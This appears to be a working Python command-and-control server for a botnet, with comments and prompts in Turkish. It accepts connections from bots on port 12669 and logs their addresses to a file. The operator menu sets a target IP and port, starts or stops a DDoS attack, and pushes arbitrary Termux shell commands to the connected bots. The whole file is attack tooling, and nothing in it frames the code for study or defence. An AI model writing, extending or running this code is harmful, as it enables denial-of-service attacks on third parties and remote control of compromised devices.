import socket
import threading
import random
from colorama import init, Fore
from pyfiglet import figlet_format

# Renkleri başlat
init()

# C2 Sunucu Konfigürasyon Ayarları
HOST = '0.0.0.0'
PORT = 12669

# C2 Server logo
def print_logo():
    logo = figlet_format("C2 SERVER", font="slant")
    print(Fore.CYAN + logo + Fore.RESET)

# Bağlantıları yönetme fonksiyonu
def handle_client(client_socket):
    global target_ip, target_port

    # Bağlantı bilgilerini dosyaya yaz
    with open("baglantilar.txt", "a") as file:
        client_address = client_socket.getpeername()
        file.write(f"Bağlantı kabul edildi: {client_address}\n")

    while True:
        try:
            # Kullanıcıdan seçenek al
            print(Fore.YELLOW + "\n1. Hedef IP ve Port Bilgilerini Belirle")
            print("2. DDoS Saldırısını Başlat veya Durdur")
            print("3. Termux'ta Komut Çalıştır")
            choice = input("Bir seçenek girin (1/2/3): ").strip()
            client_socket.send(choice.encode())

            if choice == '1':
                # Kullanıcıdan hedef IP ve port bilgilerini al
                target_ip = input("Hedef IP adresini girin: ").strip()
                target_port = input("Hedef port numarasını girin: ").strip()
                client_socket.send(f"{target_ip}:{target_port}".encode())
                print(Fore.GREEN + f"Hedef IP ve port belirlendi: {target_ip}:{target_port}" + Fore.RESET)
            elif choice == '2':
                # DDoS saldırısını başlat veya durdur
                action = input("Saldırıyı başlatmak için 'start', durdurmak için 'stop' yazın: ").strip()
                client_socket.send(action.encode())
                print(Fore.GREEN + f"Saldırı komutu gönderildi: {action}" + Fore.RESET)
            elif choice == '3':
                # Kullanıcıdan Termux komutunu al
                command = input("Çalıştırmak istediğiniz Termux komutunu girin: ").strip()
                client_socket.send(f"termux {command}".encode())
                print(Fore.GREEN + f"Komut gönderildi: {command}" + Fore.RESET)
            else:
                print(Fore.RED + "Geçersiz seçenek. Lütfen 1, 2 veya 3 girin." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Fore.RESET)
            break

# C2 sunucusunu başlat
def start_server():
    print_logo()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(Fore.YELLOW + f"Sunucu başlatıldı: {HOST}:{PORT}" + Fore.RESET)

    while True:
        client_socket, addr = server.accept()
        # Yeni bağlantı kabul edildiğinde bildirim yapma
        # Bağlantı bilgilerini dosyaya yaz
        with open("baglantilar.txt", "a") as file:
            file.write(f"Bağlantı kabul edildi: {addr}\n")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    start_server()